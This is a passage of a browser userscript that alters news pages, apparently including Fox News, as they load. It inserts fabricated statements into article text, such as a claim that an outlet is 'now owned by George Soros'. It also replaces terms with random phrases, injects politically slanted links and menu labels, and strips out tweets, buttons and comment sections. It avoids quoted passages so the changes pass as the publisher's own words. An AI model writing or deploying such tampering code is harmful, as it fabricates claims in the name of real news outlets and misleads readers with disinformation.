                  docBody[docBody.length - 1].innerHTML = docBody[docBody.length - 1].innerHTML.replace("is one of America’s fastest-growing conservative media companies", "now owned by George Soros, is one of America’s fastest-growing conservative media companies")
              }
          }

        var i;
        for (i = 0; i < docBody.length; i++) {

            // custom text
            //docBody[i].innerHTML = docBody[i].innerHTML.replace(appendTo, appendTo + appendText);
            //docBody[i].innerHTML = docBody[i].innerHTML.replace(appendTo2, appendTo2 + appendText2);
            //docBody[i].innerHTML = docBody[i].innerHTML.replace(prependTo, prependText + prependTo);
            // end custom text

            if (docBody[i].innerText.indexOf('\"') == -1 && docBody[i].innerText.indexOf('\“') == -1) {
                if (docBody[i].parentElement != null && docBody[i].parentElement != undefined) {
                    if (docBody[i].parentElement.localName != "blockquote") {
                        if(docBody[i].className !== "rmoreabt" && docBody[i].parentElement.className !== "excerpt") {
                            docBody[i].innerHTML = docBody[i].innerHTML.replace(regex, allTheCrap[Math.floor(Math.random()*allTheCrap.length)]);
                            docBody[i].outerHTML = docBody[i].outerHTML.replace(regex, allTheCrap[Math.floor(Math.random()*allTheCrap.length)]);
                            docBody[i].innerText = docBody[i].innerText.replace(regex, allTheCrap[Math.floor(Math.random()*allTheCrap.length)]);
                            docBody[i].innerHTML = docBody[i].innerHTML.replace(WOIC, nWOIC);
                            docBody[i].outerHTML = docBody[i].outerHTML.replace(WOIC, nWOIC);
                            docBody[i].innerText = docBody[i].innerText.replace(WOIC, nWOIC);

                            //kr
                            docBody[i].innerHTML = docBody[i].innerHTML.replace(kr, krDesc[Math.floor(Math.random()*krDesc.length)]);
                            docBody[i].outerHTML = docBody[i].outerHTML.replace(kr, krDesc[Math.floor(Math.random()*krDesc.length)]);
                            docBody[i].innerText = docBody[i].innerText.replace(kr, krDesc[Math.floor(Math.random()*krDesc.length)]);
                            //end kr

                            //np
                            //docBody[i].innerHTML = docBody[i].innerHTML.replace(pelosi, krDesc[Math.floor(Math.random()*krDesc.length)]);
                            //end np
                        }
                    }
                } else {
                    docBody[i].innerHTML = docBody[i].innerHTML.replace(regex, allTheCrap[Math.floor(Math.random()*allTheCrap.length)]);
                    docBody[i].outerHTML = docBody[i].outerHTML.replace(regex, allTheCrap[Math.floor(Math.random()*allTheCrap.length)]);
                    docBody[i].innerText = docBody[i].innerText.replace(regex, allTheCrap[Math.floor(Math.random()*allTheCrap.length)]);
                            docBody[i].innerHTML = docBody[i].innerHTML.replace(WOIC, nWOIC);
                            docBody[i].outerHTML = docBody[i].outerHTML.replace(WOIC, nWOIC);
                            docBody[i].innerText = docBody[i].innerText.replace(WOIC, nWOIC);

                    //kr
                    docBody[i].innerHTML = docBody[i].innerHTML.replace(kr, krDesc[Math.floor(Math.random()*krDesc.length)]);
                    docBody[i].outerHTML = docBody[i].outerHTML.replace(kr, krDesc[Math.floor(Math.random()*krDesc.length)]);
                    docBody[i].innerText = docBody[i].innerText.replace(kr, krDesc[Math.floor(Math.random()*krDesc.length)]);
                    // end kr

                    //np
                    //docBody[i].innerHTML = docBody[i].innerHTML.replace(pelosi, krDesc[Math.floor(Math.random()*krDesc.length)]);
                    // end np
                }
            } //else {
            //if (docBody[i].innerText.match(quoted) !== null && docBody[i].innerText.match(quoted) !== undefined) {
            //  if (docBody[i].innerText.match(quoted).indexOf(docBody[i].innerText.match(regexm)) == -1) {
            //    if (docBody[i].parentElement !== null && docBody[i].parentElement !== undefined) {
            //      if (docBody[i].parentElement.localName != "blockquote") {
            //        docBody[i].innerHTML = docBody[i].innerHTML.replace(regex, allTheCrap[Math.floor(Math.random()*allTheCrap.length)]);
            //      docBody[i].outerHTML = docBody[i].outerHTML.replace(regex, allTheCrap[Math.floor(Math.random()*allTheCrap.length)]);
            //    docBody[i].innerText = docBody[i].innerText.replace(regex, allTheCrap[Math.floor(Math.random()*allTheCrap.length)]);

            //kr
            //  docBody[i].innerHTML = docBody[i].innerHTML.replace(kr, krDesc[Math.floor(Math.random()*krDesc.length)]);
            // end kr

            //np
            //docBody[i].innerHTML = docBody[i].innerHTML.replace(pelosi, krDesc[Math.floor(Math.random()*krDesc.length)]);
            // end np
            //}
            //}
            //}
            //}
            //}
        }



        //for (i = 0; i < docBody.length; i++) {
        //    if (docBody[i].innerText.indexOf('\"') == -1 && docBody[i].innerText.indexOf('\“') == -1) {
        //      if (docBody[i].parentElement !== null && docBody[i].parentElement !== undefined) {
        //        if (docBody[i].parentElement.localName != "blockquote") {
        //          docBody[i].innerHTML = docBody[i].innerHTML.replace(kr, krDesc[Math.floor(Math.random()*krDesc.length)]);
        //    }
        // }
        // }
        //}

        for (i = 0; i < docBody.length; i++) {
            if(docBody[i].className !== "rmoreabt") {
                docBody[i].innerHTML = docBody[i].innerHTML.replace(antifa, antifaLink[Math.floor(Math.random()*antifaLink.length)]);
                docBody[i].innerHTML = docBody[i].innerHTML.replace(socialism, socialismLink[Math.floor(Math.random()*socialismLink.length)]);
                docBody[i].innerHTML = docBody[i].innerHTML.replace(marxism, marxismLink[Math.floor(Math.random()*marxismLink.length)]);
            }
        }


        if(window.location.host == "www.foxnews.com") {
            if (strong !== null && strong !== undefined) {
                for (i = 1; i < strong.length; i++) {
                    strong[i].innerHTML = '';
                }
            }
        }
                
        for (i = 0; i < docBody.length; i++) {
            if (docBody[i].innerText.indexOf('\"') == -1 && docBody[i].innerText.indexOf('\“') == -1) {
                if (docBody[i].parentElement !== null && docBody[i].parentElement !== undefined) {
                    if (docBody[i].parentElement.localName != "blockquote") {
                        docBody[i].innerHTML = docBody[i].innerHTML.replace(riots, riotsTxt[Math.floor(Math.random()*riotsTxt.length)]);
                        docBody[i].innerHTML = docBody[i].innerHTML.replace(nursing, nursingTxt[Math.floor(Math.random()*nursingTxt.length)]);
                    }
                }
            }
        }

        for (i = 0; i < docBody.length; i++) {
            if (docBody[i].innerText.indexOf('\"') == -1 && docBody[i].innerText.indexOf('\“') == -1) {
                if (docBody[i].parentElement !== null && docBody[i].parentElement !== undefined) {
                    if (docBody[i].parentElement.localName != "blockquote") {
                        docBody[i].innerHTML = docBody[i].innerHTML.replace(rioters, riotersTxt[Math.floor(Math.random()*riotersTxt.length)]);
                    }
                }
            }
        }

        for (i = 0; i < docTweets.length; i++) {
            docTweets[i].innerHTML = '';
            //docTweets[i].remove()
        }

        for (i = 0; i < docBody.length; i++) {
            // custom text
            docBody[i].innerHTML = docBody[i].innerHTML.replace(appendTo, appendTo + appendText);
            docBody[i].innerHTML = docBody[i].innerHTML.replace(appendTo2, appendTo2 + appendText2);
            docBody[i].innerHTML = docBody[i].innerHTML.replace(appendTo2a, appendTo2a + appendText2);
            docBody[i].innerHTML = docBody[i].innerHTML.replace(appendTo2b, appendTo2b + appendText2);
            docBody[i].innerHTML = docBody[i].innerHTML.replace(appendTo3, appendTo3 + appendText3a + appendText3b + appendText3c + appendText3d + appendText3e);
            docBody[i].innerHTML = docBody[i].innerHTML.replace(appendTo4, appendTo4 + appendText4);
            docBody[i].innerHTML = docBody[i].innerHTML.replace(appendTo5, appendTo5 + appendText5);


            docBody[i].innerHTML = docBody[i].innerHTML.replace(prependTo, prependText + prependTo);
            docBody[i].innerHTML = docBody[i].innerHTML.replace(prependTo2, prependText2 + prependTo2);
            docBody[i].innerHTML = docBody[i].innerHTML.replace(prependTo3, prependText3 + prependTo3);
            docBody[i].innerHTML = docBody[i].innerHTML.replace(prependTo4, prependText4 + prependTo4);
            // end custom text
        }

        if (document.getElementById("post-body-text") !== null && document.getElementById("post-body-text") !== undefined) {
            document.getElementById("post-body-text").innerHTML = document.getElementById("post-body-text").innerHTML.replace(/WATCH:/g, "")
        }

        //document.body.style.border = "15px solid blue";

        if (document.getElementsByTagName("button") !== null && document.getElementsByTagName("button") !== undefined) {
            for (i = 0; i < docButtons.length; i++) {
                if (docButtons[i] != null && docButtons[i] != undefined) {
                    docButtons[i].outerHTML = '';
                    //docButtons[i].innerHTML = '';
                    //docButtons[i].formAction = '';
                }
            }
        }

        //document.body.style.border = "15px solid yellow";

        if (document.getElementById("comments") !== null && document.getElementById("comments") !== undefined) {
            document.getElementById("comments").innerHTML = '';
        }

        if (document.getSelection("post-list") !== null && document.getSelection("post-list") !== undefined) {
            if (document.getSelection("post-list").anchorNode !== null && document.getSelection("post-list").anchorNode !== undefined) {
                document.getSelection("post-list").anchorNode.innerHTML = '';
            }
        }

        if (document.querySelectorAll("#disqus_thread")[0] !== null && document.querySelectorAll("#disqus_thread")[0] !== undefined) {
            document.querySelectorAll("#disqus_thread")[0].outerHTML = '';
        }

        if (document.querySelectorAll("#disqus_thread")[0] !== null && document.querySelectorAll("#disqus_thread")[0] !== undefined) {
            document.querySelectorAll("#disqus_thread")[0].innerHTML = '';
        }


        if (document.querySelectorAll("#inline-comments")[0] !== null && document.querySelectorAll("#inline-comments")[0] !== undefined) {
            document.querySelectorAll("#inline-comments")[0].outerHTML = '';
        }

        if (document.querySelectorAll(".article-footer")[0] !== null && document.querySelectorAll(".article-footer")[0] !== undefined) {
            document.querySelectorAll(".article-footer")[0].innerHTML = '';
            document.querySelectorAll(".article-footer")[0].outerHTML = '';
        }

        if (document.querySelectorAll("#spotim-lazy")[0] !== null && document.querySelectorAll("#spotim-lazy")[0] !== undefined) {
            document.querySelectorAll("#spotim-lazy")[0].outerHTML = '';
        }

        if (document.getElementById("PollyC") !== null && document.getElementById("PollyC") !== undefined) {
            document.getElementById("PollyC").dataset.mp3u = '';
        }
        
        if (document.getElementsByClassName("css-cmdiie")[1] !== null && document.getElementsByClassName("css-cmdiie")[1] !== undefined) {
            document.getElementsByClassName("css-cmdiie")[1].innerHTML = '';
        }        
        
        if (document.getElementById("menu-trending") !== null && document.getElementById("menu-trending") !== undefined) {
            document.getElementById("menu-trending").innerHTML = document.getElementById("menu-trending").innerHTML.replace(dccb, "Trump Era Crime Boom");
            document.getElementById("menu-trending").innerHTML = document.getElementById("menu-trending").innerHTML.replace(cv, "Coronavirus");
            document.getElementById("menu-trending").innerHTML = document.getElementById("menu-trending").innerHTML.replace(cbm, "Vote-By-Mail");
            document.getElementById("menu-trending").innerHTML = document.getElementById("menu-trending").innerHTML.replace(bfb, "Vice President Biden");
        }

        //document.body.style.border = "15px solid white";
    }

    var oldHref = document.location.href;

    function doReload() {

        var bodyList = document.querySelector("body"),
            observer = new MutationObserver(function(mutations) {

                mutations.forEach(function(mutation) {

                    if (oldHref != document.location.href) {

                        oldHref = document.location.href;

                        setTimeout(function (){

                            location.reload(false);


                        }, 500);



                    }

                });

            });

        var config = {
            childList: true,
            subtree: true
        };

        observer.observe(bodyList, config);

    };



   // window.onload();
    addDetails();

    window.onload = doReload;



})();
